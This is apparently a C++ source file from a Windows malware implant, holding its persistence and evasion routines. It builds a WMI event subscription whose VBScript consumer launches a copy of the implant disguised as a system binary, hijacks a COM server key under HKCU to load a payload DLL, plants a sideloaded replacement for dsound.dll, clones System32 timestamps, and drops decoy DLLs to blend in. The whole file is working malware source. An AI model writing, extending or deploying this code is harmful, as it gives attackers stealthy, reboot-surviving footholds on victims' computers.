#include "Headers.h"



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region PAYLOAD_MANAGEMENT

static BOOL GetMutexName(OUT LPSTR szMutexName, IN DWORD dwMutexNameLen)
{
constexpr BYTE      TIME_HH     = (__TIME__[0] - '0') * 10 + (__TIME__[1] - '0');
constexpr BYTE      TIME_MM     = (__TIME__[3] - '0') * 10 + (__TIME__[4] - '0');
constexpr BYTE      TIME_SS     = (__TIME__[6] - '0') * 10 + (__TIME__[7] - '0');
constexpr DWORD64   TIME_SALT   = ((DWORD64)TIME_HH << 16) | ((DWORD64)TIME_MM << 8) | TIME_SS;

    WCHAR   wszSystemDir[MAX_PATH]  = { 0 };
    WCHAR   wszRootDir[0x04]        = { 0x00, L':', L'\\', L'\0' };
    DWORD64 dw64VolumeSerial        = 0x00;
    HRESULT hResult                 = S_OK;
    SIZE_T  cbDigest                = FNV_OFFSET_BASIS;
    
    if (!GetSystemDirectoryW(wszSystemDir, MAX_PATH))
    {
        DBG_LAST_ERROR("GetSystemDirectoryW");
        return FALSE;
    }

    wszRootDir[0] = wszSystemDir[0];

    if (!GetVolumeInformationW(wszRootDir, NULL, 0, (LPDWORD)&dw64VolumeSerial, NULL, NULL, NULL, 0))
    {
        DBG_LAST_ERROR("GetVolumeInformationW");
        return FALSE;
    }

    auto fnMix = [&](DWORD64 v) 
    {
        for (int i = 0; i < 8; i++) {
            cbDigest ^= (v >> (i * 8)) & 0xFF;
            cbDigest *= FNV_PRIME;
        }
    };

    fnMix(dw64VolumeSerial);
    fnMix(TIME_SALT);

    cbDigest ^= (size_t)TIME_HH * FNV_MUL_HH;
    cbDigest ^= (size_t)TIME_MM * FNV_MUL_MM;
    cbDigest ^= (size_t)TIME_SS * FNV_MUL_SS;

    if (wsprintfA(szMutexName, MUTEX_NAME_FMT, (unsigned long long)cbDigest) < 0)
    {
        DBG_LAST_ERROR("wsprintfA");
        return FALSE;
    }

    return TRUE;
}

// Returns TRUE  if another payload instance is already running (peer detected).
// Returns FALSE if this is the first instance, in which the caller owns the mutex and must close it on exit to release the guard
BOOL AcquirePayloadMutex(OUT HANDLE* phMutex)
{
    CHAR                    szMutexName[MAX_PATH]   = { 0 };
    HANDLE                  hExisting               = NULL;
    SECURITY_ATTRIBUTES     SecurityAttr            = { 0 };
    PSECURITY_DESCRIPTOR    pSecurityDesc           = NULL;
    DWORD                   dwLastError             = ERROR_SUCCESS;

    if (!GetMutexName(szMutexName, ARRAYSIZE(szMutexName)))
        return FALSE;

    DBG("[i] Mutex Name of PID (%ld) Is: %s", GetCurrentProcessId(), szMutexName);

    // Apply a Low Integrity Level mandatory label to the security descriptor so that
    // Low IL processes can open the mutex. Without this, a Low IL caller would receive
    // ACCESS_DENIED on any cross-IL object access.
    // SDDL used: S:(ML;;NW;;;LW), where:
    //   S:   = SACL
    //   ML   = Mandatory Label ace type
    //   NW   = No-Write-Up
    //   LW   = Low integrity level
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA("S:(ML;;NW;;;LW)", SDDL_REVISION_1, &pSecurityDesc, NULL))
    {
        DBG_LAST_ERROR("ConvertStringSecurityDescriptorToSecurityDescriptorA");
        return FALSE;
    }

    SecurityAttr.nLength              = sizeof(SECURITY_ATTRIBUTES);
    SecurityAttr.lpSecurityDescriptor = pSecurityDesc;
    SecurityAttr.bInheritHandle       = FALSE;

    *phMutex    = CreateMutexA(&SecurityAttr, TRUE, szMutexName);
    dwLastError = GetLastError(); 

    LocalFree(pSecurityDesc);

    if (!*phMutex)
    {
        // CreateMutexA may fail with ERROR_ACCESS_DENIED if our process lacks
        // SeCreateGlobalPrivilege (required to create Global\ namespace objects).
        // In that case, fall back to OpenMutexA to check if the mutex already exists.
        // OpenMutexA does not require the SeCreateGlobalPrivilege privilege.
        if (dwLastError == ERROR_ACCESS_DENIED)
        {
            if ((hExisting = OpenMutexA(SYNCHRONIZE, FALSE, szMutexName)) != NULL)
            {
                // Mutex exists: another payload process is already running
                CLOSE_HANDLE(hExisting);
                return TRUE;
            }

            // Mutex does not exist and we cannot create it.
            // No other process is running, but we cant guard either.
            DBG_LAST_ERROR("OpenMutexA");
            return FALSE;
        }

        DBG_LAST_ERROR("CreateMutexA");
        return FALSE;
    }

    if (dwLastError == ERROR_ALREADY_EXISTS)
    {
        // Mutex already existed before our CreateMutexA call
        // Another payload process is running
        CLOSE_HANDLE(*phMutex);
        return TRUE;
    }

    // We own the mutex, no other payload process is running
    return FALSE;
}

VOID ReleasePayloadMutex(IN HANDLE hMutex) 
{
    if (hMutex)
    {
        ReleaseMutex(hMutex);
        CLOSE_HANDLE(hMutex);
    }
}

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region WMI_PERSISTENCE 


// IWbemClassObject::Put wrapper for string-typed properties
static BOOL SetWbemPropertyString(IN IWbemClassObject* pObj, IN LPCWSTR pszProperty, IN LPCWSTR pszValue)
{
    VARIANT var         = { 0 };
    HRESULT hResult     = S_OK;
    BOOL    bResult     = FALSE;

    var.vt = VT_BSTR;

    if (!(var.bstrVal = SysAllocString(pszValue)))
    {
        DBG_LAST_ERROR("SysAllocString");
        return FALSE;
    }

    if (FAILED((hResult = pObj->Put(pszProperty, 0, &var, 0))))
    {
        DBG_HEX_ERROR("IWbemClassObject::Put", hResult);
        DBG("[i] Failed To Set Property '%ws'", pszProperty);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    SAFE_FREE_BSTR(var.bstrVal);
    return bResult;
}

// IWbemClassObject::Put wrapper for boolean-typed properties
static BOOL SetWbemPropertyBool(IN IWbemClassObject* pObj, IN LPCWSTR pszProperty, IN BOOL bValue)
{
    VARIANT var     = { 0 };
    HRESULT hResult = S_OK;

    var.vt      = VT_BOOL;
    var.boolVal = bValue ? VARIANT_TRUE : VARIANT_FALSE;

    if (FAILED((hResult = pObj->Put(pszProperty, 0, &var, 0))))
    {
        DBG_HEX_ERROR("IWbemClassObject::Put", hResult);
        DBG("[i] Failed To Set Property '%ws'", pszProperty);
        return FALSE;
    }

    return TRUE;
}

// doubles every backslash found so that the result is safe to put in WQL 
static BOOL EscapeWqlBackslashes(IN LPCWSTR pszInput, OUT PWSTR pszOutput, IN DWORD cchOutput)
{
    DWORD   i       = 0;
    DWORD   j       = 0;

    if (!pszInput || !pszOutput || cchOutput == 0)
        return FALSE;

    for (i = 0; pszInput[i] != L'\0' && j < cchOutput - 1; i++)
    {
        if (pszInput[i] == L'\\')
        {
            if (j + 2 >= cchOutput)
                return FALSE;

            pszOutput[j++] = L'\\';
            pszOutput[j++] = L'\\';
        }
        else
        {
            pszOutput[j++] = pszInput[i];
        }
    }

    pszOutput[j] = L'\0';
    return (pszInput[i] == L'\0');
}

static BOOL CreateWmiEventSubscription(IN LPCWSTR pszBinaryPath, IN LPCWSTR pszRegHive, IN LPCWSTR pszRegKey, IN LPCWSTR pszValueName, IN LPCWSTR pszFilterPrefix, IN DWORD dwDelayInSeconds)
{
    IWbemLocator*       pLocator                                    = NULL;
    IWbemServices*      pSubscriptionSvc                            = NULL;
    IWbemClassObject*   pClass                                      = NULL;
    IWbemClassObject*   pInstance                                   = NULL;
    WCHAR               szQuery[BUFFER_SIZE_1024]                   = { 0 };
    WCHAR               szFilterName[BUFFER_SIZE_256]               = { 0 };
    WCHAR               szConsumerName[BUFFER_SIZE_256]             = { 0 };
    WCHAR               szFilterPath[BUFFER_SIZE_512]               = { 0 };
    WCHAR               szConsumerPath[BUFFER_SIZE_512]             = { 0 };
    WCHAR               szEscapedKey[BUFFER_SIZE_512]               = { 0 };
    WCHAR               szScriptText[BUFFER_SIZE_1024]              = { 0 };
    HRESULT             hResult                                     = S_OK;
    BOOL                bResult                                     = FALSE;

    if (!pszBinaryPath || !pszRegHive || !pszRegKey || !pszValueName || !pszFilterPrefix)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    // Escape backslashes in registry key path for WQL
    if (!EscapeWqlBackslashes(pszRegKey, szEscapedKey, ARRAYSIZE(szEscapedKey)))
    {
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }

    // Build the WQL event query
    if (wsprintfW(szQuery,
        L"SELECT * FROM RegistryValueChangeEvent "
        L"WHERE Hive = '%s' "
        L"AND KeyPath = '%s' "
        L"AND ValueName = '%s'",
        pszRegHive,
        szEscapedKey,
        pszValueName) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        return FALSE;
    }

    // Build the VBScript payload that the consumer will execute on each trigger
    // WScript object does not exist in ActiveScriptEventConsumer (WScript.Sleep doesnt work), so 
    // Were using the native VBScript timer loop instead
    // Also, Win32_Process.Create is used to launch the binary rather than Shell.Run or WScript.Shell
    if (wsprintfW(szScriptText,
        L"Dim oProcess\r\n"
        L"Dim pid\r\n"
        L"Dim t\r\n"
        L"t = Timer\r\n"
        L"Do While Timer < t + %d\r\n"
        L"Loop\r\n"
        L"Set oProcess = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")\r\n"
        L"oProcess.Create \"%s\", Null, Null, pid",
        dwDelayInSeconds,
        pszBinaryPath) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        return FALSE;
    }

    // Build filter/consumer names. This isnt required but its better when we need to cleanup
    if (wsprintfW(szFilterName, L"%s_Filter", pszFilterPrefix) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        return FALSE;
    }

    if (wsprintfW(szConsumerName, L"%s_Consumer", pszFilterPrefix) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        return FALSE;
    }

    // Initialize COM
    if (FAILED((hResult = CoInitializeEx(NULL, COINIT_MULTITHREADED))))
    {
        DBG_HEX_ERROR("CoInitializeEx", hResult);
        return FALSE;
    }

    if (FAILED((hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) && hResult != RPC_E_TOO_LATE)
    {
        DBG_HEX_ERROR("CoInitializeSecurity", hResult);
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLocator))))
    {
        DBG_HEX_ERROR("CoCreateInstance", hResult);
        goto _END_OF_FUNC;
    }

    // Connect to ROOT\subscription
    // This is the namespace where permanent subscriptions (filter, consumer, binding) must be stored to survive reboots
    if (FAILED((hResult = pLocator->ConnectServer(BSTR_LITERAL(L"ROOT\\subscription"), NULL, NULL, NULL, 0, NULL, NULL, &pSubscriptionSvc))))
    {
        DBG_HEX_ERROR("IWbemLocator::ConnectServer", hResult);
        goto _END_OF_FUNC;
    }

    // Set the proxy authentication level on the returned IWbemServices proxy.
    // Without this, COM may use a lower authentication level than WMI requires for write operations to ROOT\subscription
    if (FAILED((hResult = CoSetProxyBlanket((IUnknown*)pSubscriptionSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))))
    {
        DBG_HEX_ERROR("CoSetProxyBlanket", hResult);
        goto _END_OF_FUNC;
    }

    // Create __EventFilter. This defines the WQL condition that triggers the subscription
    if (FAILED((hResult = pSubscriptionSvc->GetObject(BSTR_LITERAL(L"__EventFilter"), 0, NULL, &pClass, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::GetObject", hResult);
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = pClass->SpawnInstance(0, &pInstance))))
    {
        DBG_HEX_ERROR("IWbemClassObject::SpawnInstance", hResult);
        goto _END_OF_FUNC;
    }

    if (!SetWbemPropertyString(pInstance, L"Name",           szFilterName))     goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"QueryLanguage",  L"WQL"))           goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"Query",          szQuery))          goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"EventNamespace", L"root\\default")) goto _END_OF_FUNC;      // RegistryValueChangeEvent is available from root\default

    if (FAILED((hResult = pSubscriptionSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::PutInstance", hResult);
        goto _END_OF_FUNC;
    }

    DBG("[+] Event Filter Created: %ws", szFilterName);

    pClass->Release();    pClass    = NULL;
    pInstance->Release(); pInstance = NULL;

    // Create ActiveScriptEventConsumer. This runs the VBScript payload
    if (FAILED((hResult = pSubscriptionSvc->GetObject(BSTR_LITERAL(L"ActiveScriptEventConsumer"), 0, NULL, &pClass, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::GetObject", hResult);
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = pClass->SpawnInstance(0, &pInstance))))
    {
        DBG_HEX_ERROR("IWbemClassObject::SpawnInstance", hResult);
        goto _END_OF_FUNC;
    }

    if (!SetWbemPropertyString(pInstance, L"Name",            szConsumerName)) goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"ScriptingEngine", L"VBScript"))    goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"ScriptText",      szScriptText))   goto _END_OF_FUNC;

    if (FAILED((hResult = pSubscriptionSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::PutInstance", hResult);
        goto _END_OF_FUNC;
    }

    DBG("[+] ActiveScript Consumer Created: %ws", szConsumerName);

    pClass->Release();    pClass    = NULL;
    pInstance->Release(); pInstance = NULL;

    // Create __FilterToConsumerBinding. This is to link the filter and consumer so WMI knows to invoke the consumer when the filter is triggered
    if (wsprintfW(szFilterPath, L"__EventFilter.Name=\"%s\"", szFilterName) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        goto _END_OF_FUNC;
    }

    if (wsprintfW(szConsumerPath, L"ActiveScriptEventConsumer.Name=\"%s\"", szConsumerName) < 0)
    {
        DBG_LAST_ERROR("wsprintfW");
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = pSubscriptionSvc->GetObject(BSTR_LITERAL(L"__FilterToConsumerBinding"), 0, NULL, &pClass, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::GetObject", hResult);
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = pClass->SpawnInstance(0, &pInstance))))
    {
        DBG_HEX_ERROR("IWbemClassObject::SpawnInstance", hResult);
        goto _END_OF_FUNC;
    }

    if (!SetWbemPropertyString(pInstance, L"Filter",   szFilterPath))   goto _END_OF_FUNC;
    if (!SetWbemPropertyString(pInstance, L"Consumer", szConsumerPath)) goto _END_OF_FUNC;

    if (FAILED((hResult = pSubscriptionSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL))))
    {
        DBG_HEX_ERROR("IWbemServices::PutInstance", hResult);
        goto _END_OF_FUNC;
    }

    DBG("[*] WMI Subscription Created Successfully");
    DBG("[i] Script Text:\n%ws", szScriptText);
    DBG("[i] WQL Query: %ws", szQuery);

    bResult = TRUE;

_END_OF_FUNC:
    // Release COM objects in reverse dependency order 
    if (pClass)           pClass->Release();
    if (pInstance)        pInstance->Release();
    if (pSubscriptionSvc) pSubscriptionSvc->Release();
    if (pLocator)         pLocator->Release();
    CoUninitialize();
    return bResult;
}

BOOL DropExecutableForWmi()
{
    WCHAR   wszCurrentExePath[MAX_PATH]     = { 0 };
    WCHAR   wszCurrentExeDir[MAX_PATH]      = { 0 };
    WCHAR   wszDestExePath[MAX_PATH]        = { 0 };
    HRESULT hResult                         = S_OK;

    if (GetModuleFileNameW(GetModuleHandleW(NULL), wszCurrentExePath, MAX_PATH) == 0)
    {
        DBG_LAST_ERROR("GetModuleFileNameW");
        return FALSE;
    }

    // Split current exe path into directory and file name
    if (FAILED((hResult = StringCchCopyW(wszCurrentExeDir, ARRAYSIZE(wszCurrentExeDir), wszCurrentExePath))))
    {
        DBG_HEX_ERROR("StringCchCopyW", hResult);
        return FALSE;
    }

    PathRemoveFileSpecW(wszCurrentExeDir);

    // Copy self to the WMI installation directory
    if (!CopyFileToDirW(WMI_EXE_INSTALLATION_DIR, WMI_EXE_INSTALLATION_NAME, wszCurrentExeDir, PathFindFileNameW(wszCurrentExePath), wszDestExePath, ARRAYSIZE(wszDestExePath)))
        return FALSE;

    {
        // Clone the timestamp of a real system32 binary used to make SgrmBroker.exe (our renamed exe) blend in
#define WMI_TIMESTAMP_SOURCE_EXE    L"sihost.exe"

        WCHAR wszWbemSrcPath[MAX_PATH] = { 0 };

        if (GetSystem32PathW(WMI_TIMESTAMP_SOURCE_EXE, wszWbemSrcPath, MAX_PATH))
            CloneFileTimestampsW(wszWbemSrcPath, wszDestExePath);

#undef WMI_TIMESTAMP_SOURCE_EXE
    }

    DBG("[+] Executable Copied To: %ws", wszDestExePath);

    if (!CreateWmiEventSubscription(wszDestExePath, WMI_TRIGGER_REG_HIVE, WMI_TRIGGER_REG_KEY, WMI_TRIGGER_REG_VALUE, WMI_OBJECT_PREFIX, WMI_TRIGGER_DELAY))
    {
        if (!DeleteFileW(wszDestExePath))
        {
            DBG_LAST_ERROR("DeleteFileW");
        }
        return FALSE;
    }

    return TRUE;
}

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region COM_PERSISTENCE

// Copies a set of decoy DLLs into the target directory, so that the new directory doesnt hold our DLL only
static VOID DropDecoyDlls(IN LPCWSTR wszDestDir)
{
    WCHAR           wszSystem32DllPath[MAX_PATH]    = { 0 };
    WCHAR           wszCopiedDllDst[MAX_PATH]       = { 0 };
    CONST WCHAR*    pwszDecoyDllNames[]             =
    {
        DLL_ENTRY(1),
        DLL_ENTRY(2),
        DLL_ENTRY(3),
        DLL_ENTRY(4),
        DLL_ENTRY(5),
        DLL_ENTRY(6)
    };

    for (int i = 0; i < COM_DECOY_DLLS_COUNT; i++)
    {
        RtlZeroMemory(wszSystem32DllPath, sizeof(wszSystem32DllPath));
        RtlZeroMemory(wszCopiedDllDst, sizeof(wszCopiedDllDst));

        // From system32, copy with the same name
        if (!CopyFileToDirW(wszDestDir, NULL, NULL, pwszDecoyDllNames[i], wszCopiedDllDst, ARRAYSIZE(wszCopiedDllDst)))
        {
            DBG("[!] CopyFileToDirW Failed For: %ws", pwszDecoyDllNames[i]);
            continue;
        }

        if (GetSystem32PathW(pwszDecoyDllNames[i], wszSystem32DllPath, MAX_PATH))
            CloneFileTimestampsW(wszSystem32DllPath, wszCopiedDllDst);
    }
}

// Writes the memory DLL buffer (obtained from our patched EXE) to the specified path on disk
static BOOL DropComDllToDisk(IN BYTE* pDllFileBuffer, IN DWORD dwDllFileSize, IN LPCWSTR pwszDllPath)
{
    if (!pDllFileBuffer || dwDllFileSize == 0x00 || !pwszDllPath)
        return FALSE;

    // Extract directory from full path and create it if it doesn't exist
    if (!EnsureDirectoryExistsW(pwszDllPath, TRUE))
        return FALSE;

    if (!WriteFileToDiskW(pwszDllPath, pDllFileBuffer, dwDllFileSize))
    {
        DBG("[!] Failed To Write DLL To: %ws", pwszDllPath);
        return FALSE;
    }

    return TRUE;
}

BOOL InstallComHijack(IN BYTE* pDllFileBuffer, IN DWORD dwDllFileSize)
{
    WCHAR   wszSideloadDllPath[MAX_PATH]    = { 0 };
    WCHAR   wszSystem32DllPath[MAX_PATH]    = { 0 };
    WCHAR   wszOriginalDllDst[MAX_PATH]     = { 0 };

    if (!pDllFileBuffer || dwDllFileSize == 0x00)
        return FALSE;

    if (!ExpandEnvironmentStringsW(COM_DLL_DIR L"\\" COM_PAYLOAD_DLL_NAME, wszSideloadDllPath, ARRAYSIZE(wszSideloadDllPath)))
    {
        DBG_LAST_ERROR("ExpandEnvironmentStringsW");
        return FALSE;
    }

    // Write the payload DLL path as the default value of the COM server key
    if (!SetRegistryStringW(HKEY_CURRENT_USER, COM_HIJACK_KEY, NULL, wszSideloadDllPath, FALSE))
    {
        DBG("[!] Failed To Set COM Hijack DLL Path");
        return FALSE;
    }

    if (!SetRegistryStringW(HKEY_CURRENT_USER, COM_HIJACK_KEY, COM_THREADING_MODEL, COM_THREADING_VALUE, TRUE))
    {
        DBG("[!] Failed To Set COM Threading Model");
        DeleteRegistryKeyW(HKEY_CURRENT_USER, COM_HIJACK_KEY);
        return FALSE;
    }

    // Copy the legitimate system DLL 'Windows.StateRepositoryPS.dll' (COM_SYSTEM_DLL_NAME) from System32
    // into the payload directory under the forward DLL name 'Common.StateRepositoryRM.dll' (COM_FORWARD_DLL_NAME)
    if (!CopyFileToDirW(COM_DLL_DIR, COM_FORWARD_DLL_NAME, NULL, COM_SYSTEM_DLL_NAME, wszOriginalDllDst, ARRAYSIZE(wszOriginalDllDst)))
    {
        DBG("[!] Failed To Copy Forward DLL");
        DeleteRegistryKeyW(HKEY_CURRENT_USER, COM_HIJACK_KEY);
        return FALSE;
    }

    DropDecoyDlls(COM_DLL_DIR);

    if (!DropComDllToDisk(pDllFileBuffer, dwDllFileSize, wszSideloadDllPath))
    {
        DBG("[!] Failed To Drop COM DLL To Disk");
        DeleteRegistryKeyW(HKEY_CURRENT_USER, COM_HIJACK_KEY);
        return FALSE;
    }

    if (GetSystem32PathW(COM_SYSTEM_DLL_NAME, wszSystem32DllPath, MAX_PATH))
    {
        CloneFileTimestampsW(wszSystem32DllPath, wszOriginalDllDst);
        CloneFileTimestampsW(wszSystem32DllPath, wszSideloadDllPath);
    }

    DBG("[+] COM Hijack Installed | Key: %ws | DLL: %ws", COM_HIJACK_KEY, wszSideloadDllPath);

    return TRUE;
}


#pragma endregion


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region SIDELOADING_PERSISTENCE

BOOL DropSideloadDlls(IN BYTE* pDllFileBuffer, IN DWORD dwDllFileSize)
{
    WCHAR   wszOriginalDllDst[MAX_PATH]     = { 0 };
    WCHAR   wszSystem32DllPath[MAX_PATH]    = { 0 };
    WCHAR   wszSideloadDllPath[MAX_PATH]    = { 0 };

    if (!pDllFileBuffer || dwDllFileSize == 0x00)
        return FALSE;

    // Copy the legitimate system DLL 'dsound.dll' (SIDELOAD_PAYLOAD_DLL) from System32
    // into the payload directory under the forward DLL name 'dspatial.dll' (SIDELOAD_FORWARD_DLL)
    if (!CopyFileToDirW(SIDELOAD_APP_DIR, SIDELOAD_FORWARD_DLL, NULL, SIDELOAD_PAYLOAD_DLL, wszOriginalDllDst, ARRAYSIZE(wszOriginalDllDst)))
    {
        DBG("[!] CopyFileToDirW Failed For: %ws", SIDELOAD_PAYLOAD_DLL);
        return FALSE;
    }

    if (!ExpandEnvironmentStringsW(SIDELOAD_APP_DIR L"\\" SIDELOAD_PAYLOAD_DLL, wszSideloadDllPath, ARRAYSIZE(wszSideloadDllPath)))
    {
        DBG_LAST_ERROR("ExpandEnvironmentStringsW");
        goto _DELETE_COPIED_DLL;
    }

    // Write the payload DLL under the name the application will load 'dsound.dll' (SIDELOAD_PAYLOAD_DLL)
    if (!WriteFileToDiskW(wszSideloadDllPath, pDllFileBuffer, dwDllFileSize))
    {
        DBG("[!] Failed To Write Sideload DLL To: %ws", wszSideloadDllPath);
        goto _DELETE_COPIED_DLL;
    }

    if (GetSystem32PathW(SIDELOAD_PAYLOAD_DLL, wszSystem32DllPath, MAX_PATH))
    {
        CloneFileTimestampsW(wszSystem32DllPath, wszOriginalDllDst);
        CloneFileTimestampsW(wszSystem32DllPath, wszSideloadDllPath);
    }

    DBG("[+] Sideload DLL Written To: %ws", wszSideloadDllPath);

    return TRUE;

_DELETE_COPIED_DLL:

    if (!DeleteFileW(wszOriginalDllDst))
    {
        DBG_LAST_ERROR("DeleteFileW");
    }

    return FALSE;
}

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region PAYLOAD_VERIFICATION

// Checks whether a DWORD registry value already exists and matches the expected value.
// If it does not exist, or exists with a different value, it is created/overwritten
BOOL VerifyOrCreateRegistryFlag(IN HKEY hRoot, IN LPCWSTR pwszPath, IN LPCWSTR pwszName, IN DWORD dwExpectedValue, OUT OPTIONAL BOOL* pbAlreadyExisted)
{
    DWORD   dwActualValue   = 0x00;
    BOOL    bOverwrite      = FALSE;

    if (pbAlreadyExisted)
        *pbAlreadyExisted = FALSE;

    if (GetRegistryDwordW(hRoot, pwszPath, pwszName, &dwActualValue))
    {
        if (dwActualValue == dwExpectedValue)
        {
            if (pbAlreadyExisted)
                *pbAlreadyExisted = TRUE;
            return TRUE;
        }
        // Value exists but holds a mismatching value, so we need to overwrite
        bOverwrite = TRUE;
    }
    else
    {
        DBG("[i] Registry Key Not Found, Creating ...");
    }

    if (!SetRegistryDwordW(hRoot, pwszPath, pwszName, dwExpectedValue, bOverwrite))
        return FALSE;

    return TRUE;
}

#pragma endregion
